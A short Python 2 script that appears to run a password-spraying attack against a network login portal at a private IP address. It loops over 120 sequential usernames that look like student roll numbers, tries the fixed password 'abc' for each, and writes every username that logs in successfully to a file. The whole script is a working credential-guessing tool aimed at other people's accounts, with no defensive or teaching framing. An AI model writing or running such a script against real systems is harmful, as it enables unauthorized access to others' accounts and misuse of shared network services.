#!/usr/bin/python
import urllib
usn = 1
i = 0
passwd='abc'
fp = open("user","w") 
while usn <= 120 :
   if usn <= 9:
     get = urllib.urlopen("http://192.168.2.2:8090/login.xml","mode=191&username="+"2sd11ec00"+str(usn)+"&password="+passwd+"&a=1355344698415")
   elif usn >= 10 and usn <= 99 :
     get = urllib.urlopen("http://192.168.2.2:8090/login.xml","mode=191&username="+"2sd11ec0"+str(usn)+"&password="+passwd+"&a=1355344698415")
   else :
     get = urllib.urlopen("http://192.168.2.2:8090/login.xml","mode=191&username="+"2sd11ec"+str(usn)+"&password="+passwd+"&a=1355344698415")
   p = get.readlines(5)
   str1 = p[0]
   ret_value = str1.find("in")
   if ret_value != -1:
     print usn
     fp.write(str(usn))
     fp.write("\n")
     #print usn
   usn = usn  + 1
